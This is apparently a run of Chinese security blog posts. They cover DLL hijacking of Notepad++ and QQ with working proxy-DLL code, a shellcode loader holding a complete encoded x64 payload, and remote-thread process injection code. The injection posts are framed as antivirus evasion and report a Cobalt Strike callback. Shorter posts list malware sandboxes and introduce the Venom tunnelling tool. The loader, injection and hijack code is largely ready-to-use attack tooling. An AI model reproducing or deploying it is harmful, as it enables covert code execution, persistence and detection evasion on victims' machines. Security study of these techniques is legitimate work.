计算机\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs 那么最终Windows2003以上以及win7以上操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。 进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）； 系统目录（即%windir%system32）； 16位系统目录（即%windir%system）； Windows目录（即%windir%）； 当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）； PATH环境变量中的各个目录 DLL正常调用demoDLLdemovs2019新建动态链接库模板项目 项目结构如下 在dllmain.cpp中添加如下代码 123456789101112131415161718192021// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;#include &lt;stdlib.h&gt;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: system(&quot;calc&quot;); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 该dll的作用是在进程调用该dll时执行计算器 添加头文件test.h 123#pragma once#include &lt;windows.h&gt;extern &quot;C&quot; _declspec(dllexport) void msg(void); __declspec(dllexport)用于Windows中的动态库中，声明导出函数msg供其它程序调用 添加cpp文件实现msg方法 123456#include &quot;pch.h&quot;#include &quot;test.h&quot;#include &lt;windows.h&gt;void msg() &#123; MessageBox(0, L&quot;This is msg function:-)&quot;, 0, 0);&#125; 调用demo新建一个控制台项目 123456789101112131415161718192021222324#include &lt;iostream&gt;#include &lt;Windows.h&gt;using namespace std;int main()&#123; //定义函数类DLLFUNC typedef void(*DLLFUNC)(void); DLLFUNC GetDllfunc = NULL; //指定需要加载的dll文件 HINSTANCE hinst = LoadLibrary(L&quot;hijack.dll&quot;);//加载dll文件 if (hinst != NULL) &#123; //获取函数的位置 GetDllfunc = (DLLFUNC)GetProcAddress(hinst, &quot;msg&quot;);//获取dll中的方法 &#125; if (GetDllfunc != NULL) &#123; //运行msg函数 (*GetDllfunc)();//调用dll中的方法 &#125; else &#123; MessageBox(0, L&quot;Error!&quot;, 0, 0); exit(0); &#125; printf(&quot;end&quot;);&#125; 将consoleapplication 与dll文件放在同一目录，运行exe 可以看到，根据代码逻辑调用了dll文件，弹出了计算器并且成功调用了msg方法 什么是DLL劫持由上述的DLL加载顺序得知，如果某个程序需要的dll文件在程序根目录不存在，会继续向后寻找dll文件，那么我们手动编写一个dll文件至程序根目录并且将dll名称改为程序需要的那个缺少的dll文件，根据加载顺序会优先加载我们编写的dll文件，实现dll劫持的效果。dll劫持的目的是替换/劫持/新增 恶意dll文件实现代码执行。 由此可以引出几种dll劫持的形式： 直接将恶意dll暴力替换掉正常dll，软件正常功能会受影响 将恶意dll作为中间人，转发调用正常dll的导出函数，同时加入额外的恶意操作 利用加载顺序的机制，让恶意dll先于正常dll加载 利用软件本身缺失的dll加载恶意dll 更改环境变量或是.exe.manifest/.exe.local文件实现dll重定向 如果利用低权限劫持的dll文件，会被高权限程序加载运行，就是一个权限提升漏洞 DLL劫持实例劫持Notepad++不存在的DLL一般可以使用processmonitor、process explorer查找可能存在dll劫持的进程 使用process monitor查找与notepad++相关的进程，注：notepad++不要用最新版，最新版修复了劫持漏洞，这里用的是6.6.6版本。 这里打开过后设置几个过滤条件，分别是进程名、路径以及结果 然后这里找一个需要用到loadlibrary这个api的dll，这里找有这个api的原因是因为如果该dll的调用栈中存在有 **LoadLibrary(Ex)**，说明这个DLL是被进程所动态加载的。在这种利用场景下，伪造的DLL文件不需要存在任何导出函数即可被成功加载，即使加载后进程内部出错，也是在DLL被成功加载之后的事情。 可以看到，Msimg32.dll文件是程序运行需要但是没找到的，所以我们可以写一个Msimg32.dll文件放到程序根目录实现动态恶意dll加载。 将刚才的dll hijack demo生成的dll文件放到notepad++的根目录并改名为Msimg32.dll，当再次打开notepad++.exe时即可完成劫持 劫持Notepad++中存在的DLL将procmon中NOT FOUND 的条件改为SUCCESS 发现存在loadLibraryEx，尝试劫持该dll 使用工具CFF explorer查看该DLL的输出函数，输出函数是可以被外部访问的，就像刚才写的demo一样 编写dll文件内容如下 12345678910111213141516171819202122232425// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;#include &lt;stdlib.h&gt;extern &quot;C&quot; __declspec(dllexport) void Scintilla_DirectFunction();BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;void Scintilla_DirectFunction()&#123; system(&quot;calc.exe&quot;);&#125; 生成DLL改名为SciLexer.dll并放到notepad++根目录并尝试运行 发现报错了，感觉是dll中有些内容是必须实现的，但是我们不知道其内容是什么，所以考虑其他方法劫持该dll 下面使用dll转发的方式劫持该dll dll文件代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142# include &quot;pch.h&quot;# include &lt;stdlib.h&gt;extern &quot;C&quot; __declspec(dllexport) void Scintilla_DirectFunction();BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: system(&quot;calc&quot;); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;void Scintilla_DirectFunction()&#123; HINSTANCE hDll = LoadLibrary(L&quot;SciLexer_re.dll&quot;); if (hDll) &#123; //typedef 是定义了一个新的类型 //DWORD是双字类型 4个字节,API函数中有很多参数和返回值是DWORD //定义了类型EXPFUNC，并且返回类型是DWORD的函数的指针 typedef DWORD(WINAPI* EXPFUNC)(); EXPFUNC expFunc = NULL; expFunc = (EXPFUNC)GetProcAddress(hDll, &quot;Scintilla_DirectFunction&quot;); if (expFunc) &#123; expFunc(); &#125; &#125; return;&#125; 将原始dll文件SciLexer.dll改名为SciLexer_re.dll，将该文件改名为SciLexer.dll并放到notepad++.exe的目录下，该dll起了转发的作用，调用顺序为exe-&gt;SciLexer.dll-&gt;SciLexer_re.dll 需要注意的是，本次测试环境vs2019配置release x86生成的dll才能正常运行，猜测notepad++为32位。 运行notepad.exe即可弹出计算器，但是无法正常运行notepad.exe 直接转发劫持QQ这里还是使用导入表进行劫持，首先用cff(下载地址:[https://ntcore.com/files/CFF_Explorer.zip]) 打开QQ.exe的导入表，找一个不在HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Session) Manager\\KnownDLLs路径里面的dll进行劫持，因为在这个路径里面的dll是优先加载的，加载之后已经进入内核空间，想要劫持难度很大。这里我选择的是libuv.dll进行劫持 使用aheadlib生成cpp文件并放到vscode的dll项目中，代码如下，记住libuvOrg这个名字，后面要用。 12345678910111213141516171819202122232425// 头文件#include &lt;Windows.h&gt;#include&lt;stdlib.h&gt;// 导出函数#pragma comment(linker, &quot;/EXPORT:uv_accept=libuvOrg.uv_accept,@1&quot;) // 获取原始函数地址FARPROC WINAPI GetAddress(PCSTR pszProcName)&#123;#pragma comment(linker, &quot;/EXPORT:uv_accept=libuvOrg.uv_accept,@1&quot;)//代码很长，我去了大部分#pragma comment(linker, &quot;/EXPORT:uv_accept=libuvOrg.uv_accept,@1&quot;)形式的自动生成的代码&#125;// 入口函数BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)&#123; system(&quot;calc&quot;); if (dwReason == DLL_PROCESS_ATTACH) &#123; DisableThreadLibraryCalls(hModule); &#125; else if (dwReason == DLL_PROCESS_DETACH) &#123; &#125; return TRUE;&#125; 采用release x86编译生成dll文件，将生成的dll文件命名位libuv.dll并放到原dll目录下，将原dll文件命名为libuvOrg.dll，双击qq.exe即可弹出计算器 即时调用劫持QQtodo，一直报错，麻了。 劫持不存在的dll–音速启动音速启动V5安装程序，打开procmon过滤进程名和NAME NOT FOUND： 发现音速启动在当前安装目录尝试加载DLL，打开一些NOT FOUND 的dll调用栈看一下 尝试劫持，将上文生成的dll hijack demo改名为SHFOLDER.dll并放至与安装文件同目录 再次运行安装文件，即可弹出计算器 自动化DLL劫持检测工具–Rattlergithub地址：https://github.com/sensepost/rattler/releases/tag/v1.0 使用时需要注意，要根据程序是64位还是32位选择Rattler版本，否则识别失败。 使用Rattler建议的DLL文件尝试劫持 将生成的CRYPTBASE.DLL放到应用根目录，可以看到成功弹出了计算器 红队武器化todo，https://www.anquanke.com/post/id/232891 白加黑免杀实现权限维持实现DLL劫持防御及实例参考链接https://www.anquanke.com/post/id/232891 https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/ https://drunkmars.top/2021/10/03/dll%E5%8A%AB%E6%8C%81/","categories":[],"tags":[],"author":"Polo"},{"title":"免杀基础之认识shellcode加载器","slug":"免杀基础之认识shellcode加载器","date":"2022-01-15T09:37:24.000Z","updated":"2022-01-15T09:37:24.000Z","comments":true,"path":"2022/01/15/免杀基础之认识shellcode加载器/","link":"","permalink":"https://polosec.github.io/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%AE%A4%E8%AF%86shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/","excerpt":"","text":"认识shellcode加载器下面是一个最简单的shellcode加载器，目的是将shellcode加载到内存中并执行。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#define _CRT_SECURE_NO_DEPRECATE#include &quot;Windows.h&quot;int main()&#123; unsigned char buf[] = &quot;\\x48\\x31\\xc9\\x48\\x81\\xe9\\xc6\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff&quot; &quot;\\xff\\xff\\x48\\xbb\\xa2\\xd8\\x0e\\xfe\\xd3\\xcd\\x9c\\xae\\x48\\x31\\x58&quot; &quot;\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\x5e\\x90\\x8d\\x1a\\x23\\x25&quot; &quot;\\x5c\\xae\\xa2\\xd8\\x4f\\xaf\\x92\\x9d\\xce\\xff\\xf4\\x90\\x3f\\x2c\\xb6&quot; &quot;\\x85\\x17\\xfc\\xc2\\x90\\x85\\xac\\xcb\\x85\\x17\\xfc\\x82\\x90\\x85\\x8c&quot; &quot;\\x83\\x85\\x93\\x19\\xe8\\x92\\x43\\xcf\\x1a\\x85\\xad\\x6e\\x0e\\xe4\\x6f&quot; &quot;\\x82\\xd1\\xe1\\xbc\\xef\\x63\\x11\\x03\\xbf\\xd2\\x0c\\x7e\\x43\\xf0\\x99&quot; &quot;\\x5f\\xb6\\x58\\x9f\\xbc\\x25\\xe0\\xe4\\x46\\xff\\x03\\x46\\x1c\\x26\\xa2&quot; &quot;\\xd8\\x0e\\xb6\\x56\\x0d\\xe8\\xc9\\xea\\xd9\\xde\\xae\\x58\\x85\\x84\\xea&quot; &quot;\\x29\\x98\\x2e\\xb7\\xd2\\x1d\\x7f\\xf8\\xea\\x27\\xc7\\xbf\\x58\\xf9\\x14&quot; &quot;\\xe6\\xa3\\x0e\\x43\\xcf\\x1a\\x85\\xad\\x6e\\x0e\\x99\\xcf\\x37\\xde\\x8c&quot; &quot;\\x9d\\x6f\\x9a\\x38\\x7b\\x0f\\x9f\\xce\\xd0\\x8a\\xaa\\x9d\\x37\\x2f\\xa6&quot; &quot;\\x15\\xc4\\xea\\x29\\x98\\x2a\\xb7\\xd2\\x1d\\xfa\\xef\\x29\\xd4\\x46\\xba&quot; &quot;\\x58\\x8d\\x80\\xe7\\xa3\\x08\\x4f\\x75\\xd7\\x45\\xd4\\xaf\\x72\\x99\\x56&quot; &quot;\\xbf\\x8b\\x93\\xc5\\xf4\\xe3\\x80\\x4f\\xa7\\x92\\x97\\xd4\\x2d\\x4e\\xf8&quot; &quot;\\x4f\\xac\\x2c\\x2d\\xc4\\xef\\xfb\\x82\\x46\\x75\\xc1\\x24\\xcb\\x51\\x5d&quot; &quot;\\x27\\x53\\xb7\\x6d\\xba\\xef\\x9c\\xfd\\xeb\\x3c\\xfe\\xd3\\x8c\\xca\\xe7&quot; &quot;\\x2b\\x3e\\x46\\x7f\\x3f\\x6d\\x9d\\xae\\xa2\\x91\\x87\\x1b\\x9a\\x71\\x9e&quot; &quot;\\xae\\xa3\\x63\\xce\\x56\\x7d\\xce\\xdd\\xfa\\xeb\\x51\\xea\\xb2\\x5a\\x3c&quot; &quot;\\xdd\\x14\\xee\\xaf\\x28\\xf9\\x2c\\x18\\xd0\\x27\\x48\\xb0\\x0f\\xff\\xd3&quot; &quot;\\xcd\\xc5\\xef\\x18\\xf1\\x8e\\x95\\xd3\\x32\\x49\\xfe\\xf2\\x95\\x3f\\x37&quot; &quot;\\x9e\\xfc\\x5c\\xe6\\x5d\\x18\\x46\\x77\\x11\\x85\\x63\\x6e\\xea\\x51\\xcf&quot; &quot;\\xbf\\x69\\x27\\x93\\x71\\x42\\x27\\xdb\\xb6\\x5a\\x0a\\xf6\\xbe\\xe3\\x80&quot; &quot;\\x42\\x77\\x31\\x85\\x15\\x57\\xe3\\x62\\x97\\x5b\\xa7\\xac\\x63\\x7b\\xea&quot; &quot;\\x59\\xca\\xbe\\xd1\\xcd\\x9c\\xe7\\x1a\\xbb\\x63\\x9a\\xd3\\xcd\\x9c\\xae&quot; &quot;\\xa2\\x99\\x5e\\xbf\\x83\\x85\\x15\\x4c\\xf5\\x8f\\x59\\xb3\\xe2\\x0d\\xf6&quot; &quot;\\xa3\\xfb\\x99\\x5e\\x1c\\x2f\\xab\\x5b\\xea\\x86\\x8c\\x0f\\xff\\x9b\\x40&quot; &quot;\\xd8\\x8a\\xba\\x1e\\x0e\\x96\\x9b\\x44\\x7a\\xf8\\xf2\\x99\\x5e\\xbf\\x83&quot; &quot;\\x8c\\xcc\\xe7\\x5d\\x18\\x4f\\xae\\x9a\\x32\\x54\\xe3\\x2b\\x19\\x42\\x77&quot; &quot;\\x12\\x8c\\x26\\xd7\\x6e\\xe7\\x88\\x01\\x06\\x85\\xad\\x7c\\xea\\x27\\xc4&quot; &quot;\\x75\\xdd\\x8c\\x26\\xa6\\x25\\xc5\\x6e\\x01\\x06\\x76\\x6c\\x1b\\x00\\x8e&quot; &quot;\\x4f\\x44\\x75\\x58\\x21\\x33\\x5d\\x0d\\x46\\x7d\\x17\\xe5\\xa0\\xa8\\xde&quot; &quot;\\xd2\\x8e\\x05\\x33\\xb8\\x99\\x15\\xe5\\xcb\\x7c\\x91\\xb9\\xcd\\xc5\\xef&quot; &quot;\\x2b\\x02\\xf1\\x2b\\xd3\\xcd\\x9c\\xae&quot;; void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, buf, sizeof(buf)); ((void(*)())exec)(); return 0;&#125; 其中，VirtualAlloc()的作用是在虚拟内存空间中申请一块区域 12345678/* VirtualAlloc( NULL, // 基址 800, // 大小 MEM_COMMIT, // 内存页状态 PAGE_EXECUTE_READWRITE // 可读可写可执行 ); */ void *memcpy(void *str1, const void *str2, size_t n) 从存储区 str2 复制 n 个字节到存储区 str1,在上述实例中是将buf复制到exec中，大小为sizeof(buf) 下面这句话比较关键， ((void(*)())exec)() 理解这句话首先要回顾c语言相关知识，*p代表一个指针，指针指向某个函数的地址，而*p()则代表了调用p所指向的函数。 标准的调用方法为(*p)(),简写为p() 示例如下 1234567891011121314151617181920212223242526272829# include &lt;stdio.h&gt;int Max(int, int); //函数声明int main(void)&#123; int (*p)(int, int); //定义一个函数指针 int a, b, c,d; p = Max; //把函数Max赋给指针变量p, 使p指向Max函数 printf(&quot;please enter a and b:&quot;); scanf(&quot;%d%d&quot;, &amp;a, &amp;b); c = p(a, b); // 通过函数指针调用Max函数 d = (*p)(a, b); // 这样调用也行 printf(&quot;a = %d\\nb = %d\\nmax = %d,%d\\n&quot;, a, b, c,d); return 0;&#125;int Max(int x, int y) //定义Max函数&#123; int z; if (x &gt; y) &#123; z = x; &#125; else &#123; z = y; &#125; return z;&#125; 输出结果为 1234please enter a and b:3 4a &#x3D; 3b &#x3D; 4max &#x3D; 4 在上述代码中定义了int型的指针p，p指向一个函数，该函数接受两个int型的参数 如果p是指向返回类型为void的函数的指针，那么p的声明应该类似 1void (*p)(); 在c语言的类型转换中，如果想把float类型转为int型的话，强制类型转换方法如下： float a=1.1; float b=(int)a; 虽然上述例子与int b=a;的结果一致，但上述例子突出了使用强制类型转换：把变量a从float类型专为了int类型，那么我们可以得到类型转换的方法为在变量前面加**(type)，这里的type就是int**,即**(int),我们从变量声明的int a;到类型转换的(int) a 的区别为：去掉变量名**与分号，并将剩余部分括起来，就得到了int型的强制类型转换方法。 如果我们想得到一个void类型的函数的指针应该怎么做？ 上面提到的 1void (*p)(); 是一个void类型的函数指针p的变量声明，根据上述规则，强制转换方法为**(void ()())**,即我们可以在某变量前面添加*(void (*)())**将其强制转换为返回值为空的指向函数的指针类型。 现在再把下面的代码拆开理解： 1( (void(*)()) exec )()； (void()())代表将exec转为返回值为空的指针类型，( (void()()) exec )()和( * (void(*)()) exec )()等价，都是代表调用返回值类型为void的函数指针exec所指向的函数. 参考https://fengwenhua.top/index.php/archives/64/","categories":[],"tags":[],"author":"Polo"},{"title":"免杀基础之远程线程注入","slug":"免杀基础之远程线程注入","date":"2022-01-15T09:36:51.000Z","updated":"2022-01-15T09:36:51.000Z","comments":true,"path":"2022/01/15/免杀基础之远程线程注入/","link":"","permalink":"https://polosec.github.io/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/","excerpt":"","text":"前言本文主要参考 https://fengwenhua.top/index.php/archives/65/，其中最终代码参考https://sevrosecurity.com/2020/04/08/process-injection-part-1-createremotethread/中的high level API。 远程线程中执行shellcodeshellcode代码与地址无关，理论上将shellcode放入任意程序中给它一个起点就可以执行，因此考虑将shellcode注入到其他进程中以起到隐蔽执行的目的，可以考虑注入到经常进行网络连接的进程中以起到更好的隐蔽效果。 流程与函数介绍VirtualAllocEx()1234567LPVOID VirtualAllocEx( HANDLE hProcess, // 申请内存所在的进程句柄 LPVOID lpAddress, // 保留页面的内存地址，一般用NULL自动分配 SIZE_T dwSize, // 欲分配的内存大小，字节为单位，通常是shellcode大小 DWORD flAllocationType, // 指定要分配的内存类型，常用 MEM_RESERVE | MEM_COMMIT DWORD flProtect // 指定分配的内存保护，由于它将包含要执行的代码，因此常用 PAGE_EXECUTE_READWRITE，可读可写可执行); VirtualAllocEx()用于在指定进程开辟内存空间，所需参数主要为进程的handler，所以需要使用OpenProcess函数获取。 OpenProcess()12345HANDLE OpenProcess( DWORD dwDesiredAccess, // 渴望得到的访问权限（标志），那肯定是PROCESS_ALL_ACCESS，所有权限啊 BOOL bInheritHandle, // 是否继承句柄，一般不 DWORD dwProcessId // 进程标识符，即受害者进程的PID); 使用OpenProcess获取进程的handler，需要知道进程的PID。 假设知道了进程的PID，那么应该如何将shellcode拷贝进去？之前简单的加载器用的是memcpy方法拷贝shellcode，但是因为我们要写入的是进程的内存区域，所以需要用WriteProcessMemory函数 WriteProcessMemory（）1234567BOOL WriteProcessMemory( HANDLE hProcess, // 要向其中写入数据的进程，即由OpenProcess返回的进程句柄 LPVOID lpBaseAddress, // 要写入的数据的首地址，VirtualAllocEx的返回值 LPCVOID lpBuffer, // 指向要写的数据的指针，该指针必须是const指针，即shellcode SIZE_T nSize, // 要写入的字节数，shellcode大小 SIZE_T *lpNumberOfBytesWritten // 接收传输到指定进程中的字节数，通常为NULL); 将shellcode写入内存后，需要调用一下，调用方法为CreateRemoteThread() CreateRemoteThread()CreateRemoteThread是一个Windows API函数，它能够创建一个在其它进程地址空间中运行的线程 123456789HANDLE CreateRemoteThread( HANDLE hProcess, // 线程所属进程的进程句柄，即OpenProcess返回的句柄 LPSECURITY_ATTRIBUTES lpThreadAttributes, // 线程的安全属性，通常为NULL SIZE_T dwStackSize, // 线程栈初始大小,以字节为单位，通常为0，即代表使用系统默认大小. LPTHREAD_START_ROUTINE lpStartAddress, // 在远程进程的地址空间中,该进程的线程函数的起始地址。VirtualAllocEx返回值，注意需要强制类型转换成 LPTHREAD_START_ROUTINE LPVOID lpParameter, // 传给线程函数的参数的指针，这里为NULL，在DLL注入的时候有重要意义 DWORD dwCreationFlags, // 线程的创建标志，通常为0，即线程创建后立即运行 LPDWORD lpThreadId // 指向所创建线程ID的指针，通常为NULL); 将shellcode注入到notepad.exe中(已知pid)12345678910111213141516171819202122#define _CRT_SECURE_NO_DEPRECATE#include &quot;Windows.h&quot;#include &quot;stdio.h&quot;int main(int argc, char* argv[])&#123; unsigned char buf[] = &quot;&quot;; HANDLE processHandle; HANDLE remoteThread; PVOID remoteBuffer; printf(&quot;Injecting to PID: %i&quot;, atoi(argv[1])); processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1]))); remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(processHandle, remoteBuffer, buf, sizeof buf, NULL); remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); CloseHandle(processHandle); return 0;&#125; 可以看到shellcode已经被注入到notepad.exe了，并且与CS teamserver建立了网络连接，但是这样不是太方便，需要先知道进程的pid，所以该代码还需要改进。 将shellcode注入到指定进程中(未知pid)代码如下，但是该方法存在一个问题，注入的权限要求有点大，我试了试注入其他进程（Windows自带的）失败了（管理员权限可以随便注入），所以该方法适用于可以RCE的时候，先打开一个notepad然后进行注入。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#pragma comment(linker,&quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;)#pragma comment(linker, &quot;/INCREMENTAL:NO&quot;)#pragma comment(linker, &quot;/section:.data,RWE&quot;)#include &lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;tchar.h&gt;#include&lt;stdio.h&gt;int main(int argc, char* argv[])&#123; HANDLE hProcessSnap; HANDLE processHandle; PROCESSENTRY32 pe32; DWORD pid = 0; // 获取系统中所有进程的快照 hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hProcessSnap == INVALID_HANDLE_VALUE) &#123; CloseHandle(hProcessSnap); exit(-1); &#125; // 使用之前要先设置大小 pe32.dwSize = sizeof(PROCESSENTRY32); // 查看第一个进程 BOOL bRet = Process32First(hProcessSnap, &amp;pe32); if (!bRet) &#123; exit(-2); &#125; while (bRet) &#123; if (wcscmp(pe32.szExeFile, L&quot;notepad.exe&quot;) == 0) &#123;//注入到notepad.exe进程中 pid = pe32.th32ProcessID; break; &#125; bRet = Process32Next(hProcessSnap, &amp;pe32); &#125; // 获取进程句柄 processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); // 清理 CloseHandle(hProcessSnap); //远程线程注入部分 unsigned char buf[] = &quot;&quot;; HANDLE remoteThread; PVOID remoteBuffer; remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(processHandle, remoteBuffer, buf, sizeof buf, NULL); remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); CloseHandle(processHandle); return 0;&#125; 当权限为管理员的时候，可以注入任意进程。上面的cmd框是正常用户权限启动的cmd，下面是run as admin。 新建进程并注入shellcode上面的方法只能注入到现有进程，并且存在权限问题，实用性较低，现考虑新建进程并远程线程注入shellcode. 注意，下面的代码被杀穿了，还不如shellcode直接加载的效果好，因为注入本来就不是正常操作，不加shellcode上传vt也有13个报毒，仅学习思想。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#pragma comment(linker,&quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;)#pragma comment(linker, &quot;/INCREMENTAL:NO&quot;)#pragma comment(linker, &quot;/section:.data,RWE&quot;)#include &lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;tchar.h&gt;#include &lt;iostream&gt;#include&lt;stdio.h&gt;int main(int argc, char* argv[])&#123; HANDLE processHandle; PROCESSENTRY32 pe32; STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); ZeroMemory(&amp;pi, sizeof(pi)); //配置startup info，隐藏新启动的进程窗口 si.cb = sizeof(si); si.cb = sizeof(STARTUPINFO); si.lpReserved = NULL; si.lpDesktop = NULL; si.lpTitle = NULL; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; si.cbReserved2 = NULL; si.lpReserved2 = NULL; LPCWSTR cmd; cmd = L&quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;; if (!CreateProcess( cmd, // Executable NULL, // Command line NULL, // Process handle not inheritable NULL, // Thread handle not inheritable FALSE, // Set handle inheritance to FALSE CREATE_NO_WINDOW, // Do Not Open a Window NULL, // Use parent&#x27;s environment block NULL, // Use parent&#x27;s starting directory &amp;si, // Pointer to STARTUPINFO structure &amp;pi // Pointer to PROCESS_INFORMATION structure (removed extra parentheses) )) &#123; DWORD errval = GetLastError(); std::cout &lt;&lt; &quot;FAILED&quot; &lt;&lt; errval &lt;&lt; std::endl; &#125; WaitForSingleObject(pi.hProcess, 1000); // Allow nslookup 1 second to start/initialize. //远程线程注入部分 unsigned char buf[] = &quot;&quot;; for (int i = 0; i &lt; sizeof(buf); i++) &#123; buf[i] = buf[i] ^ 17; &#125; HANDLE remoteThread; PVOID remoteBuffer; remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(pi.hProcess, remoteBuffer, buf, sizeof buf, NULL); remoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); return 0;&#125;","categories":[],"tags":[],"author":"Polo"},{"title":"几款优秀的在线样本分析网站(重保值守必备）","slug":"几款优秀的在线样本分析网站-重保值守必备）","date":"2022-01-12T09:24:00.000Z","updated":"2022-01-12T09:28:21.000Z","comments":true,"path":"2022/01/12/几款优秀的在线样本分析网站-重保值守必备）/","link":"","permalink":"https://polosec.github.io/2022/01/12/%E5%87%A0%E6%AC%BE%E4%BC%98%E7%A7%80%E7%9A%84%E5%9C%A8%E7%BA%BF%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E7%BD%91%E7%AB%99-%E9%87%8D%E4%BF%9D%E5%80%BC%E5%AE%88%E5%BF%85%E5%A4%87%EF%BC%89/","excerpt":"","text":"排名不分先后，都比较优秀（除了腾讯哈勃） 1.virustotal 懂得都懂，用的最多，开放引擎api最多 亮点功能：在线样本提交与扫描，较为全面。 2.sandbox.pikker.ee 亮点功能：免费，字符串提取，静态行为分析，杀软结果识别，进程分析，文件释放分析，网络连接分析，释放的文件也可以进行分析 3.ThreadBook sandbox 微步在线云沙箱 https://s.threatbook.cn/ 亮点功能：免费，在线杀软识别，行为检测（API调用），执行流程图，进程调用与网络连接 4.yomi.yoroi.company 亮点功能：支持试用；行为分析、动态分析、网络分析、文件释放分析、进程调用图、释放的文件也可以进行分析 5.腾讯哈勃 https://habo.qq.com/file/ 垃圾：不支持sha1 sha256搜索 亮点功能：免费 6.https://www.hybrid-analysis.com/ 亮点功能：免费、分析全面（网络、进程、DNS、HTTP、文件释放），释放的文件也可以进行分析，字符串搜索，结合VT结果 7.https://analyze.intezer.com/file-analyses 亮点功能：除了不免费外（可试用，但只有两周），基本都是亮点。反汇编！！、动态分析、静态分析、网络、进程、文件释放、分析释放的文件、字符串搜索、结合VT结果。。。。等等 文件释放分析： 推断出了样本中的代码和哪些恶意样本的重合率高，这里推出了net traveler APT组织。 字符串搜索与反汇编","categories":[],"tags":[],"author":"Polo"},{"title":"Venom——一款优秀的基于go语言实现的内网穿透工具","slug":"Venom——一款优秀的基于go语言实现的内网穿透工具","date":"2022-01-10T14:44:36.000Z","updated":"2022-01-10T14:44:36.000Z","comments":true,"path":"2022/01/10/Venom——一款优秀的基于go语言实现的内网穿透工具/","link":"","permalink":"https://polosec.github.io/2022/01/10/Venom%E2%80%94%E2%80%94%E4%B8%80%E6%AC%BE%E4%BC%98%E7%A7%80%E7%9A%84%E5%9F%BA%E4%BA%8Ego%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/","excerpt":"","text":"前言为什么选择使用Venom？我认为是方便、快捷、便于理解。 Venom介绍Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。 Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理。 渗透测试人员可以使用Venom轻松地将网络流量代理到多层内网，并轻松地管理代理节点 项目地址：https://github.com/Dliv3/Venom 特性 可视化网络拓扑 多级socks5代理 多级端口转发 端口复用 (apache/mysql/…) ssh隧道 交互式shell 文件的上传和下载 节点间通信加密 支持多种平台(Linux/Windows/MacOS)和多种架构(x86/x64/arm/mips) 实验拓扑 VPS./admin -lport 8888 VM1agent.exe -rhost VPS -rport 8888 VPS收到来自VM1的请求 